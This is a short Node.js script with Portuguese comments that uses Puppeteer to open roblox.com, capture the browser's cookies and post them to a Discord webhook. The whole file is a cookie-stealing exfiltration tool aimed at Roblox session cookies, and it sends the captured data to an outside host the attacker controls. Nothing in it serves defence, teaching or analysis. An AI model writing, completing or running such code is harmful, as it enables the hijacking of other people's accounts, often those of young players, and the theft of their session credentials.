const puppeteer = require('puppeteer');
const fetch = require('node-fetch');

async function main() {
    const browser = await puppeteer.launch({ headless: false }); // Para ver o navegador em ação, troque para true para rodar em background
    const page = await browser.newPage();

    // Abre o Roblox
    await page.goto('https://www.roblox.com/', { waitUntil: 'networkidle2' });

    // Captura os cookies
    const cookies = await page.cookies();

    // Envia os cookies para o Discord webhook
    const webhookUrl = 'https://discord.com/api/webhooks/SEU_WEBHOOK';
    const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: JSON.stringify(cookies) }),
    });

    if (response.ok) {
        console.log('Cookies enviados com sucesso para o Discord!');
    } else {
        console.error('Erro ao enviar cookies para o Discord');
    }

    await browser.close();
}

main();
